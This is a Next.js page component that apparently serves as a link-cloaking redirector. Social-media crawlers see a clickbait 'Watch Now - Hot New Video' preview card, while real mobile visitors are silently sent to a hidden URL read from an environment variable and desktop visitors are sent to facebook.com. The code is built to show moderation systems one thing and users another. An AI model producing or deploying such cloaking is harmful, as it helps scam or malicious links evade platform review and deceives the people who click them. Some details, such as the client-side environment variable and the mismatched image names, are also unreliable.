// app/page.tsx
"use client";

import { useEffect } from "react";

export default function Home() {
  useEffect(() => {
    const userAgent = navigator.userAgent.toLowerCase();
    const isBot =
      userAgent.includes("facebook") ||
      userAgent.includes("twitter") ||
      userAgent.includes("linkedin") ||
      userAgent.includes("discord") ||
      userAgent.includes("bot");

    const isMobile = /iphone|ipad|android|blackberry|iemobile|opera mini/.test(
      userAgent,
    );

    if (!isBot) {
      if (isMobile) {
        window.location.href = process.env.MOBILE_REDIRECT_URL;
      } else {
        window.location.href = "https://facebook.com";
      }
    }
  }, []);

  return (
    <>
      <title>My Facebook Preview Page</title>
      <meta property="og:title" content="Watch Now - Hot New Video" />
      <meta property="og:description" content="Tap to watch the video now!" />
      <meta
        property="og:image"
        content="https://my-app-crih.vercel.app/preview.jpeg"
      />
      <meta property="og:url" content="https://my-app-crih.vercel.app/" />
      <meta property="og:type" content="website" />

      <main style={{ padding: 40, textAlign: "center" }}>
        <h1>Watch Now</h1>
        <p>Redirecting...</p>
        <img
          src="/preview.jpg"
          alt="preview"
          style={{ width: "100%", maxWidth: 500 }}
        />
      </main>
    </>
  );
}
